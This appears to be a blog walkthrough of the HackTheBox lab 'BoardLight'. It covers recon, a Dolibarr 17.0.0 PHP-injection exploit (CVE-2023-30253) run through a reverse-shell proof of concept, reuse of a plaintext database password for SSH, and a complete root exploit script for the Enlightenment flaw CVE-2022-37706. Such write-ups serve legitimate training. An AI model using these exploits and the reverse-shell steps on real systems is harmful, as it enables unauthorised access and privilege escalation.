---
title: BoardLight HackTheBox
author: Saad
date: 2024-11-18 00:00:00 +0500
categories:
  - HackTheBox
tags:
  - cve-2023-30253
  - cve-2022-37706
  - dolibarr
  - enlightenment
image: boardlight.png
media_subpath: /assets/img/boardlight-htb
---

## Box Info:
Boardlight was an easy Linux box running a Dolibarr instance vulnerable to `CVE-2023-30253`. After gaining a foothold as www-data, the configuration files revealed plaintext credentials, leading to SSH access. System enumeration uncovered an `SUID` binary related to `enlightenment`, which is vulnerable to `CVE-2022-37706`, allowing root access to the machine.
## Recon

![](https://latesthackingnews.com/wp-content/uploads/2016/10/scan-everything.jpg)

### Nmap

First off, I'll run nmap on the box to see what we are up against.

![](scan.png)

```console
➜  boardlight nmap -sCV 10.129.238.92 -oA scan.txt -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 08:42 EST
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 20.18% done; ETC: 08:42 (0:00:12 remaining)
Nmap scan report for 10.129.238.92
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.48 seconds
```
As we can see from the nmap results that only `Port 22` and `Port 80` are open, these common ports doesn't provide much information.

### Site Port 80

A simple Website for a Cybersecurity Company which has nothing useful for us.

![](website.png)

At the bottom of the page, it shows the domain `board.htb`, I'll add it to my `/etc/hosts`.

![](domain.png)

```
echo '10.129.238.92 board.htb' | sudo tee -a /etc/hosts
```
#### directory brute force

I ran gobuster but seems like found nothing useful.

```
➜ gobuster dir -u http://board.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -x .php
===============================================================
<SNIP>
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 307] [--> http://board.htb/images/]
/js                   (Status: 301) [Size: 303] [--> http://board.htb/js/]
/css                  (Status: 301) [Size: 304] [--> http://board.htb/css/]
/contact.php          (Status: 200) [Size: 9426]
/about.php            (Status: 200) [Size: 9100]
/index.php            (Status: 200) [Size: 15949]
/do.php               (Status: 200) [Size: 9209]
```
#### sub-domain enum
Directory enumeration didn't gave anything useful, but when fuzzed for subdomains `crm` can be found.

```console
➜ ffuf -u http://10.129.238.92 -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.238.92
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 178ms]
:: Progress: [4989/4989] :: Job [1/1] :: 224 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```
### crm.board.htb

Adding into `/etc/hosts/`.

```
echo '10.129.238.92 crm.board.htb' | sudo tee -a /etc/hosts
```
Looking at it, we find a login page for an instance of Dolibarr, an open-source ERP/CRM platform.

The first step is always to try default and common credentials. Searching for Dolibarr default credentials, many articles suggest different ones. However, admin/admin worked out of the box.

On examining the dashboard, it doesn’t appear that the user has admin privileges.

![](https://media.makeameme.org/created/no-admin-permissions.jpg)

## Shell as www-data
### CVE-2023-30253 - Manually
When logging in or on dashboard we can see it's version `17.0.0` of Dolibarr.
![](googly.png)

Found only one relevant [article](https://www.swascan.com/security-advisory-dolibarr-17-0-0/) explaining the vulnerability:

A user with the “Read website content” and “Create/modify website content (HTML and JavaScript content)” privileges can achieve remote command execution via PHP code injection, bypassing application restrictions.

The admin user has both the Read website content and Create/modify website content (HTML and JavaScript content) privileges. Let’s exploit this vulnerability:

**create site**
![](create_site.png)

**create a page**
![](create_page.png)

Now that we have created the site and page, we can edit the source. 

![](edit_html.png)

When I tried to add `PHP` code, it didn't really work.

![](no_perms.png)

> You don't have permission to add or edit PHP dynamic content in websites. Ask permission or just keep code into php tags unmodified.

But if I change it to `<?Php` or `<?PHP` it saves it just fine with no problems. 

![](bypass.png)

After saving the page, we can preview it by clicking this binoculars.

![](bino.png)

We can see that command gets executed.

![](exec.png)

### CVE-2023-30253 - POC script

![](https://media.tenor.com/R1TfzmBHEC0AAAAe/hacker-im.png)

I assume the `auto clean` scripts on the box is removing the created websites, I'll be using this [POC script](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) to get a shell.

```bash
➜ python3 exploit.py http://crm.board.htb admin admin 10.10.14.78 9001
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

On the listening port, there is a shell.

![](https://media.tenor.com/nPd-ijwBSKQAAAAe/hacker-pc.png)

```console
➜  ~ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.78] from (UNKNOWN) [10.129.238.92] 42378
bash: cannot set terminal process group (842): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
```
**Upgrade the shell**
```
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ script -qc /bin/bash /dev/null
<docs/public/website$ script -qc /bin/bash /dev/null
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ ^Z
[1]  + 52159 suspended  nc -nvlp 9001
➜  ~ stty raw -echo;fg
[1]  + 52159 continued  nc -nvlp 9001

www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
```

## Shell as larissa

### Enumeration

As we can see there is only `root` and `larissa` user with a shell.
```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```
Enumerating around the `crm.board.htb` directory we can find The Dolibarr's configuration file `/var/www/html/crm.board.htb/htdocs/conf/conf.php`.

```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls
conf.php  conf.php.example  conf.php.old
```

`conf.php` contains bunch of content, But the most interesting one is db password.

```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
<SNIP>
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
<SNIP>
//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
```

The password `serverfun2$2023!!` works for `larissa` user, both over `SSH` and `su`.

### SSH

![](https://dm7500.github.io/assets/htb-swagshop/meme.php.png)

```
➜  ~ sshpass -p 'serverfun2$2023!!' ssh larissa@board.htb

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

larissa@boardlight:~$ wc -c user.txt
33 user.txt
```

## Shell as root

**_Any Hint for ROOT SIR?_**

### Enumeration

#### No sudo power :(
```
larissa@boardlight:~$ sudo -l
[sudo] password for larissa:
Sorry, user larissa may not run sudo on localhost.
```

####  SUID 

When tried to look for SUIDs, Found four SetUIDs on `enlightenment` are really interesting.
It's Windows manager for X Windows System. 

```console
larissa@boardlight:~$  find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

![](https://ih1.redbubble.net/image.3725444730.8638/fposter,small,wall_texture,square_product,600x600.jpg)

### CVE-2022-37706

`enlightenment_sys` is vulnerable to [CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706).
> enlightenment_sys in Enlightenment before 0.25.4 allows local users to gain privileges because it is setuid root, and the system library function mishandles pathnames that begin with a /dev/.. substring. 

This [Writeup](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) on goes in depth for this vulnerability, There is really nice shell script on that repo we can use to exploit it.

```bash
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```
I'll save it as `root.sh` on the box and run it.

```
larissa@boardlight:~$ bash root.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
# script -qc /bin/bash /dev/null
root@boardlight:/home/larissa# wc -c /root/root.txt
33 /root/root.txt
```
![](https://external-preview.redd.it/tgmcL09Q8AFiRJuZrSrzhaCzMsZjqSIs8vRjykb-UF0.jpg?auto=webp&s=7e7e8c346e5edd5a209118921d72daaa9243a94a)

Thanks for reading, Have a great day!

![PEPE](https://media.tenor.com/anVMFFvkDG0AAAAe/pepe-hacker.png)